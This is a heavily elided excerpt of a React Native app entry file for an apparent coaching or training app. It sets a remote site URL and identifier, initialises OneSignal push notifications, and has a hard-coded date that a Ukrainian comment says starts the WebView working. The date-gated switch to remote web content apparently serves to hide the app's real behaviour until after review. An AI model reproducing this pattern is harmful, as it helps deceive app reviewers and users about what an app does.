...
import ProductScreen from './bestcoachtrainsrc/bestcoachtrainsc/ProductScreen.jsx';
...
const App = () => {
  ...
  const INITIAL_URL = `https://sleek-sync-lab.site/`;
  const URL_IDENTIFAIRE = `sJX71K4T`;
  ...
  OneSignal.initialize('aacd7115-fb9d-4592-b63d-c86cc171b9f5');
  ...
  useEffect(() => {
    ...
    const targetData = new Date('2025-11-15T08:08:00'); //дата з якої поч працювати webView
  ...
  ///////// Loader
  const [isLoadingEstrTrainSuite, setIsLoadingEstrTrainSuite] = useState(false)

  useEffect(() => {
    setTimeout(() => {
      setIsLoadingEstrTrainSuite(true);
    }, 2500);
  }, []);
  ...
  }, [slideAnim, screenWidth, isLoadingEstrTrainSuite]);

  return (
    <NavigationContainer>
      <ContextProvider>
        {!isLoadingEstrTrainSuite ? (
